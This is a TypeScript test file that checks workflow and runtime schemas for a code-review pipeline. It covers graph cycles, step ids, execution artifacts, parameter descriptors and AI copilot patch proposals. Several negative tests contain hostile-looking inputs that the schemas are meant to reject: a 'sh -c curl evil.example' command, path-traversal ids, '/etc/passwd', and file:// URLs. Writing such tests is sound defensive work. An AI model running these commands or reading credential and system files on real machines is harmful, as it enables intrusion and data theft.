import { describe, expect, it } from "vitest";
import {
  collectWorkflowGraphIssues,
  stepExecutionArtifactSchema,
  stepIdSchema,
  workflowEvidenceItemSchema,
  workflowSpecSchema
} from "./workflow";
import { MAX_PUBLIC_PARAMETER_DEPTH, workflowRuntimeCopilotProposalRequestSchema, workflowRuntimeCopilotProposalResponseSchema, workflowRuntimeCopilotProposalSchema, workflowRuntimeDefinitionSchema, workflowRuntimeExecutablePlanSchema, workflowRuntimeParameterSchemaDescriptorSchema, workflowRuntimePublicParameterSchema, workflowRuntimeSaveDefinitionRequestSchema, workflowRuntimeValidationResultSchema } from "./workflow-runtime";

const validSpec = {
  version: 2,
  name: "security-hardening",
  nodes: [
    { id: "secrets", uses: "engine.security" },
    { id: "semgrep", uses: "tool.semgrep", needs: ["secrets"] }
  ],
  verifiers: [{ id: "tests", uses: "verify.unit_tests", needs: ["semgrep"] }],
  synthesizer: { needs: ["tests"] }
} as const;

describe("WorkflowSpec v2", () => {
  it("parses a linear pipeline and fills execution defaults", () => {
    const spec = workflowSpecSchema.parse(validSpec);
    expect(spec.nodes[0]?.needs).toEqual([]);
    expect(spec.nodes[0]?.timeoutMs).toBe(60_000);
    expect(spec.nodes[0]?.continueOnError).toBe(false);
    expect(spec.synthesizer.id).toBe("synthesizer");
    expect(spec.synthesizer.uses).toBe("synthesize.review_report");
    expect(collectWorkflowGraphIssues(spec)).toEqual([]);
  });

  it("rejects a cyclic graph", () => {
    expect(() => workflowSpecSchema.parse({
      ...validSpec,
      nodes: [
        { id: "a", uses: "engine.style", needs: ["b"] },
        { id: "b", uses: "engine.semantic", needs: ["a"] }
      ],
      verifiers: [],
      synthesizer: { needs: ["a"] }
    })).toThrow(/cycle/i);
  });

  it("rejects dangling, duplicate, and self references", () => {
    expect(() => workflowSpecSchema.parse({
      ...validSpec,
      nodes: [{ id: "a", uses: "engine.style", needs: ["ghost"] }],
      verifiers: [],
      synthesizer: { needs: ["a"] }
    })).toThrow(/unknown step 'ghost'/);

    expect(() => workflowSpecSchema.parse({
      ...validSpec,
      nodes: [
        { id: "a", uses: "engine.style" },
        { id: "a", uses: "engine.semantic" }
      ],
      verifiers: [],
      synthesizer: { needs: ["a"] }
    })).toThrow(/Duplicate step id 'a'/);

    expect(() => workflowSpecSchema.parse({
      ...validSpec,
      nodes: [{ id: "a", uses: "engine.style", needs: ["a"] }],
      verifiers: [],
      synthesizer: { needs: ["a"] }
    })).toThrow(/cannot depend on itself/);
  });

  it("keeps analyzers on the allowlist rather than accepting arbitrary commands", () => {
    expect(() => workflowSpecSchema.parse({
      ...validSpec,
      nodes: [{ id: "a", uses: "sh -c 'curl evil.example'" }],
      verifiers: [],
      synthesizer: { needs: ["a"] }
    })).toThrow();
  });

  it("constrains step ids to artifact-safe identifiers", () => {
    expect(stepIdSchema.parse("dep-graph_1")).toBe("dep-graph_1");
    expect(() => stepIdSchema.parse("../escape")).toThrow();
    expect(() => stepIdSchema.parse("1leading")).toThrow();
    expect(() => stepIdSchema.parse("Upper")).toThrow();
  });

  it("requires at least one analyzer node", () => {
    expect(() => workflowSpecSchema.parse({ ...validSpec, nodes: [], verifiers: [] })).toThrow();
  });
});

describe("workflow execution artifacts", () => {
  it("records argv, exit code, and an input digest", () => {
    const artifact = stepExecutionArtifactSchema.parse({
      stepId: "semgrep",
      uses: "tool.semgrep",
      status: "succeeded",
      command: ["semgrep", "--config", "p/owasp-top-ten", "--json"],
      exitCode: 0,
      startedAt: "2026-08-05T12:00:00.000Z",
      inputDigest: "a".repeat(64)
    });
    expect(artifact.command).toHaveLength(4);
    expect(artifact.rawOutput).toBe("");
  });

  it("rejects a digest that is not a SHA-256 hex string", () => {
    expect(() => stepExecutionArtifactSchema.parse({
      stepId: "semgrep",
      uses: "tool.semgrep",
      status: "succeeded",
      exitCode: 0,
      startedAt: "2026-08-05T12:00:00.000Z",
      inputDigest: "not-a-digest"
    })).toThrow();
  });

  it("allows a null exit code for a step killed before it reported", () => {
    expect(stepExecutionArtifactSchema.parse({
      stepId: "tests",
      uses: "verify.unit_tests",
      status: "timed_out",
      exitCode: null,
      startedAt: "2026-08-05T12:00:00.000Z",
      inputDigest: "b".repeat(64)
    }).exitCode).toBeNull();
  });
});

describe("runtime definition identity", () => {
  const definition = { id: "review_1", version: 1 as const, nodes: [{ id: "scan", type: "review", serviceRef: "review", parameters: {}, failurePolicy: "fail-closed" as const }], edges: [] };
  it("uses canonical ids for definitions and nested save requests", () => {
    expect(workflowRuntimeDefinitionSchema.parse(definition).id).toBe("review_1");
    for (const id of ["../../Bearer SECRET", "", "bad/id", "Aupper", "a".repeat(300)]) {
      expect(() => workflowRuntimeDefinitionSchema.parse({ ...definition, id })).toThrow();
    }
    expect(workflowRuntimeSaveDefinitionRequestSchema.parse({ definition }).definition.id).toBe("review_1");
    expect(() => workflowRuntimeSaveDefinitionRequestSchema.parse({ definitionId: "other", definition })).toThrow();
  });
});

describe("runtime parameter descriptors", () => {
  it("accepts string[] enumValues and validates every default element", () => {
    const field = workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "analyzers", label: "Analyzers", type: "string[]", required: false, enumValues: ["style", "secret"], default: ["style"] }] }).fields[0]!;
    expect(field.enumValues).toEqual(["style", "secret"]);
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "analyzers", label: "Analyzers", type: "string[]", required: false, enumValues: ["style", "secret"], default: ["unknown"] }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "analyzers", label: "Analyzers", type: "string[]", required: false, enumValues: ["style"], default: "style" }] })).toThrow();
  });

  it("rejects missing enum values, mismatched defaults, and illegal enumValues", () => {
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "mode", label: "Mode", type: "enum", required: true }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "x", label: "X", type: "number", required: false, default: "bad" }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "x", label: "X", type: "string", required: false, enumValues: ["x"] }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "x", label: "X", type: "string", required: false }, { name: "x", label: "X2", type: "string", required: false }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "mode", label: "Mode", type: "enum", required: true, enumValues: ["a", "a"] }] })).toThrow();
    expect(() => workflowRuntimeParameterSchemaDescriptorSchema.parse({ fields: [{ name: "modes", label: "Modes", type: "string[]", required: false, enumValues: ["a", "b"], default: ["a", "a"] }] })).toThrow();
  });
});

describe("workflow runtime validation result", () => {
  const plan = {
    definitionId: "review_1",
    definitionVersion: 1 as const,
    agentSpecs: [{ nodeId: "scan", serviceRef: "review", order: 0, coeffects: [], capabilityRequirements: [], parameters: { analyzers: ["style"] } }],
  };

  it("enforces success/failure cross-field invariants and strict fields", () => {
    expect(workflowRuntimeValidationResultSchema.parse({ ok: true, errors: [], plan })).toEqual({ ok: true, errors: [], plan });
    expect(workflowRuntimeValidationResultSchema.parse({ ok: false, errors: [{ code: "schema_invalid", path: [], message: "bad" }] })).toMatchObject({ ok: false });
    for (const value of [
      { ok: true, errors: [{ code: "schema_invalid", path: [], message: "bad" }], plan },
      { ok: true, errors: [] },
      { ok: false, errors: [] },
      { ok: false, errors: [{ code: "schema_invalid", path: [], message: "bad" }], plan },
      { ok: true, errors: [], plan, extra: true },
    ]) expect(() => workflowRuntimeValidationResultSchema.parse(value)).toThrow();
  });

  it("uses canonical plan ids and excludes paths, secrets, and handles", () => {
    expect(workflowRuntimeExecutablePlanSchema.parse(plan).definitionId).toBe("review_1");
    for (const id of ["../escape", "Aupper", "1leading", "a".repeat(129)]) {
      expect(() => workflowRuntimeExecutablePlanSchema.parse({ ...plan, definitionId: id })).toThrow();
    }
    for (const parameters of [
      { path: "/etc/passwd" },
      { rootPath: "C:\\\\repo" },
      { apiToken: "secret" },
      { nested: { handle: "raw-capability" } },
      { value: "file:///tmp/private" },
      { value: "FiLe://C:/private" },
      { value: "file%3A%2F%2F%2Ftmp%2Fprivate" },
    ]) expect(() => workflowRuntimePublicParameterSchema.parse(parameters)).toThrow();
    expect(workflowRuntimePublicParameterSchema.parse({
      http: "https://example.test/a/b",
      relative: "./src/index.ts",
      encodedRelative: "%2E%2Fsrc%2Findex.ts",
    })).toEqual({ http: "https://example.test/a/b", relative: "./src/index.ts", encodedRelative: "%2E%2Fsrc%2Findex.ts" });
    expect(workflowRuntimePublicParameterSchema.parse({ analyzers: ["style"], enabled: true, count: 2, nested: { ok: null } })).toEqual({ analyzers: ["style"], enabled: true, count: 2, nested: { ok: null } });
  });

  it("fails closed at the bounded recursive depth without overflowing on wide arrays", () => {
    const nested = (depth: number): unknown => {
      let value: unknown = "ok";
      for (let index = 0; index < depth; index += 1) value = { child: value };
      return { value };
    };
    expect(() => workflowRuntimePublicParameterSchema.parse(nested(MAX_PUBLIC_PARAMETER_DEPTH))).not.toThrow();
    expect(() => workflowRuntimePublicParameterSchema.parse(nested(MAX_PUBLIC_PARAMETER_DEPTH + 1))).toThrow();
    expect(() => workflowRuntimePublicParameterSchema.parse({ values: Array.from({ length: 10_000 }, () => "ok") })).not.toThrow();
  });
});

describe("workflow evidence", () => {
  it("requires line bounds to be paired and ordered", () => {
    expect(workflowEvidenceItemSchema.parse({
      file: "apps/api/src/http.ts",
      excerpt: "app.post('/admin', handler)"
    }).metadata).toEqual({});

    expect(() => workflowEvidenceItemSchema.parse({
      file: "apps/api/src/http.ts",
      excerpt: "x",
      startLine: 10
    })).toThrow();

    expect(() => workflowEvidenceItemSchema.parse({
      file: "apps/api/src/http.ts",
      excerpt: "x",
      startLine: 20,
      endLine: 10
    })).toThrow();
  });
});

describe("workflow copilot proposal (CKPT6 Phase 3 WorkflowPatch)", () => {
  const addNode = { op: "ADD_NODE" as const, nodeId: "secret-scan", serviceRef: "deterministic-evidence.analyzer" };
  const definition = {
    id: "flow-1",
    version: 1 as const,
    nodes: [{ id: "analyze", type: "analyzer.deterministic-evidence", serviceRef: "deterministic-evidence.analyzer", parameters: {}, failurePolicy: "fail-closed" as const }],
    edges: [],
  };

  it("parses a legal proposal with ADD_NODE and ADD_EDGE operations", () => {
    const proposal = {
      patch: [addNode, { op: "ADD_EDGE", from: "analyze", to: "secret-scan" }],
      rationale: "adds a scan node between analyze and the synthesizer",
    };
    expect(workflowRuntimeCopilotProposalSchema.parse(proposal)).toEqual(proposal);
    expect(workflowRuntimeCopilotProposalResponseSchema.parse({ proposal }).proposal.rationale).toBe(proposal.rationale);
  });

  it("accepts the optional descriptive name, parameters, and basis fingerprint", () => {
    const proposal = {
      patch: [{ ...addNode, name: "Secret Scan", parameters: { analyzers: ["style"] } }],
      rationale: "r",
      basis: { definitionFingerprint: "abc123" },
    };
    expect(workflowRuntimeCopilotProposalSchema.parse(proposal)).toEqual(proposal);
  });

  it("rejects unknown operations, unknown fields, and malformed node ids", () => {
    for (const patch of [
      [{ op: "REMOVE_NODE", nodeId: "analyze" }],
      [{ ...addNode, condition: "severity >= high" }],
      [{ op: "ADD_EDGE", from: "analyze", to: "secret-scan", condition: "severity >= high" }],
      [{ ...addNode, nodeId: "Bad_Upper" }],
      [{ ...addNode, extra: true }],
    ]) {
      expect(() => workflowRuntimeCopilotProposalSchema.parse({ patch, rationale: "r" })).toThrow();
    }
    // Registry whitelist and edge-endpoint existence are SERVER-side fail-closed
    // checks (the shared schema cannot encode the runtime registry); the schema
    // layer only enforces shape.
    expect(workflowRuntimeCopilotProposalSchema.parse({
      patch: [{ ...addNode, serviceRef: "not-in-registry.service" }, { op: "ADD_EDGE", from: "analyze", to: "ghost" }],
      rationale: "r",
    }).patch).toHaveLength(2);
  });

  it("rejects an empty patch and an overlong rationale", () => {
    expect(() => workflowRuntimeCopilotProposalSchema.parse({ patch: [], rationale: "r" })).toThrow();
    expect(() => workflowRuntimeCopilotProposalSchema.parse({ patch: [addNode], rationale: "" })).toThrow();
    expect(() => workflowRuntimeCopilotProposalSchema.parse({ patch: [addNode], rationale: "x".repeat(2001) })).toThrow();
    expect(() => workflowRuntimeCopilotProposalSchema.parse({ patch: Array.from({ length: 33 }, () => addNode), rationale: "r" })).toThrow();
    expect(workflowRuntimeCopilotProposalSchema.parse({ patch: Array.from({ length: 32 }, () => addNode), rationale: "r" }).patch).toHaveLength(32);
  });

  it("requires exactly one of definition or definitionId on the request", () => {
    expect(workflowRuntimeCopilotProposalRequestSchema.parse({ instruction: "add a scan", definition })).toMatchObject({ instruction: "add a scan" });
    expect(workflowRuntimeCopilotProposalRequestSchema.parse({ instruction: "add a scan", definitionId: "flow-1" })).toMatchObject({ instruction: "add a scan" });
    for (const request of [
      { instruction: "add a scan" },
      { instruction: "add a scan", definition, definitionId: "flow-1" },
      { instruction: "", definition },
      { instruction: "x".repeat(2001), definition },
      { instruction: "add a scan", definition: { ...definition, nodes: [] } },
      { instruction: "add a scan", definition, extra: true },
    ]) expect(() => workflowRuntimeCopilotProposalRequestSchema.parse(request)).toThrow();
  });
});
